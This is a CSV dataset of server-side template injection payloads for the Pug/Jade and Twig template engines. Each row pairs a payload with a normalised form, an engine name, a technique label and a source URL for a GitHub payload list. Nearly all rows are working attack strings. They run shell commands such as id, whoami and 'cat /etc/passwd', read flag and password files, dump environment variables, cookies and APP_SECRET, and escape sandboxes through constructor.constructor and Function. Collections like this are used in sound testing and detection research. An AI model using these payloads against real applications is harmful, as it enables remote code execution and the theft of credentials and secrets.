"#{process.mainModule.require('child_process').spawn('ls',['-la'])}","#{process.mainmodule.require('S').spawn('S',['S'])}",javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').fork('id')},#{process.mainmodule.require('S').fork('S')},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').hostname()},#{process.mainmodule.require('S').hostname()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').type()},#{process.mainmodule.require('S').type()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').platform()},#{process.mainmodule.require('S').platform()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').arch()},#{process.mainmodule.require('S').arch()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').release()},#{process.mainmodule.require('S').release()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').uptime()},#{process.mainmodule.require('S').uptime()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').loadavg()},#{process.mainmodule.require('S').loadavg()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').totalmem()},#{process.mainmodule.require('S').totalmem()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').freemem()},#{process.mainmodule.require('S').freemem()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').cpus()},#{process.mainmodule.require('S').cpus()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').networkInterfaces()},#{process.mainmodule.require('S').networkinterfaces()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').userInfo()},#{process.mainmodule.require('S').userinfo()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').homedir()},#{process.mainmodule.require('S').homedir()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('os').tmpdir()},#{process.mainmodule.require('S').tmpdir()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('os').hostname()},!{process.mainmodule.require('S').hostname()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('os').userInfo()},!{process.mainmodule.require('S').userinfo()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('os').networkInterfaces()},!{process.mainmodule.require('S').networkinterfaces()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('child_process').execSync('id').toString()},#{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('child_process').execSync('whoami').toString()},#{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('child_process').execSync('cat /etc/passwd').toString()},#{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('child_process').execSync('ls -la').toString()},#{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('child_process').execSync('uname -a').toString()},#{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('child_process').execSync('pwd').toString()},#{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('child_process').execSync('env').toString()},#{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('child_process').execSync('cat flag.txt').toString()},#{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{require('fs').readFileSync('/etc/passwd','utf8')}","#{require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{require('fs').readFileSync('flag.txt','utf8')}","#{require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('fs').readdirSync('/')},#{require('S').readdirsync('S')},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{require('fs').readdirSync('.')},#{require('S').readdirsync('S')},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{require('child_process').execSync('id').toString()},!{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{require('child_process').execSync('whoami').toString()},!{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{require('child_process').execSync('cat /etc/passwd').toString()},!{require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"!{require('fs').readFileSync('/etc/passwd','utf8')}","!{require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"!{require('fs').readFileSync('flag.txt','utf8')}","!{require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('cat${IFS}/etc/passwd').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('cat$IFS/etc/passwd').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('child_process').spawnSync('sh',['-c','cat</etc/passwd']).stdout.toString()}","#{process.mainmodule.require('S').spawnsync('S',['S','S']).stdout.tostring()}",javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('child_process').spawnSync('sh',['-c','cat<flag.txt']).stdout.toString()}","#{process.mainmodule.require('S').spawnsync('S',['S','S']).stdout.tostring()}",javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('calc').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('cmd /c calc').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('cmd /c dir').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('powershell.exe').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('cmd.exe /c whoami').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('child_process').execSync('cmd /c whoami').toString()},!{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('child_process').spawnSync('cmd',['/c','whoami']).stdout.toString()}","#{process.mainmodule.require('S').spawnsync('S',['S','S']).stdout.tostring()}",javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('child_process').spawnSync('powershell',['-c','whoami']).stdout.toString()}","#{process.mainmodule.require('S').spawnsync('S',['S','S']).stdout.tostring()}",javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('net').isIP('127.0.0.1')},#{process.mainmodule.require('S').isip('S')},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('dns').lookup('localhost')},#{process.mainmodule.require('S').lookup('S')},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('http').request},#{process.mainmodule.require('S').request},javascript,Pug/Jade,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('https').request},#{process.mainmodule.require('S').request},javascript,Pug/Jade,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('url').parse('http://example.com')},#{process.mainmodule.require('S').parse('S')},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('path').resolve('/')},#{process.mainmodule.require('S').resolve('S')},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('path').dirname('/etc/passwd')},#{process.mainmodule.require('S').dirname('S')},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('crypto').getHashes()},#{process.mainmodule.require('S').gethashes()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('crypto').getCiphers()},#{process.mainmodule.require('S').getciphers()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('util').inspect(process.env)},#{process.mainmodule.require('S').inspect(process.env)},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('util').inspect(process.env)},!{process.mainmodule.require('S').inspect(process.env)},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{Function('return this')()},#{function('S')()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{Function('return process')()},#{function('S')()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{Function('return global')()},#{function('S')()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{Function('return process.mainModule.require(""child_process"").execSync(""id"").toString()')()}",#{function('S')()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{Function('return process.mainModule.require(""child_process"").execSync(""whoami"").toString()')()}",#{function('S')()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{Function('return process.mainModule.require(""child_process"").execSync(""cat /etc/passwd"").toString()')()}",#{function('S')()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"!{Function('return process.mainModule.require(""child_process"").execSync(""id"").toString()')()}",!{function('S')()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{constructor.constructor('return process')()},#{constructor.constructor('S')()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{constructor.constructor('return global')()},#{constructor.constructor('S')()},javascript,Pug/Jade,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{constructor.constructor('return process.mainModule.require(""child_process"").execSync(""id"").toString()')()}",#{constructor.constructor('S')()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{constructor.constructor('return process.mainModule.require(""child_process"").execSync(""whoami"").toString()')()}",#{constructor.constructor('S')()},javascript,Pug/Jade,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
{{app}},{{app}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_context}},{{_context}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{dump(_context)}},{{dump(_context)}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'a'|upper}},{{'S'|upper}},php,Twig,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['id']|reduce('system')}},{{['S']|reduce('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['id']|sort('system')}},{{['S']|sort('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{['id','']|sort('system')}}","{{['S','S']|sort('S')}}",php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{{'id':0}|map('system')}},{{{'S':N}|map('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'id'|filter('exec')}},{{'S'|filter('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'id'|map('exec')}},{{'S'|map('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'id'|filter('passthru')}},{{'S'|filter('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'id'|map('passthru')}},{{'S'|map('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'id'|filter('shell_exec')}},{{'S'|filter('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{'id'|map('shell_exec')}},{{'S'|map('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['cat /etc/passwd']|map('system')}},{{['S']|map('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['whoami']|filter('system')}},{{['S']|filter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['ls -la']|map('system')}},{{['S']|map('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['uname -a']|filter('system')}},{{['S']|filter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['env']|map('system')}},{{['S']|map('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{['pwd']|filter('system')}},{{['S']|filter('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env}},{{_self.env}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getExtensions()}},{{_self.env.getextensions()}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('exec')}},{{_self.env.registerundefinedfiltercallback('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('system')}},{{_self.env.registerundefinedfiltercallback('S')}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('passthru')}},{{_self.env.registerundefinedfiltercallback('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('shell_exec')}},{{_self.env.registerundefinedfiltercallback('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.registerUndefinedFilterCallback('popen')}},{{_self.env.registerundefinedfiltercallback('S')}},php,Twig,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
"{{_self.env.setCache(""/var/www/html"")}}","{{_self.env.setcache(""S"")}}",php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.enableDebug()}},{{_self.env.enabledebug()}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.enableAutoReload()}},{{_self.env.enableautoreload()}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.disableStrictVariables()}},{{_self.env.disablestrictvariables()}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getCache()}},{{_self.env.getcache()}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getTags()}},{{_self.env.gettags()}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getFilters()}},{{_self.env.getfilters()}},php,Twig,1,feature-abuse,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getFunctions()}},{{_self.env.getfunctions()}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getTests()}},{{_self.env.gettests()}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getGlobals()}},{{_self.env.getglobals()}},php,Twig,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getLoader()}},{{_self.env.getloader()}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.getCharset()}},{{_self.env.getcharset()}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.isDebug()}},{{_self.env.isdebug()}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.isAutoReload()}},{{_self.env.isautoreload()}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{_self.env.isStrictVariables()}},{{_self.env.isstrictvariables()}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request}},{{app.request}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.server}},{{app.request.server}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.server.all}},{{app.request.server.all}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.query}},{{app.request.query}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.query.all}},{{app.request.query.all}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.request}},{{app.request.request}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.cookies}},{{app.request.cookies}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.files}},{{app.request.files}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
{{app.request.server.get('APP_SECRET')}},{{app.request.server.get('S')}},php,Twig,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/twig.txt
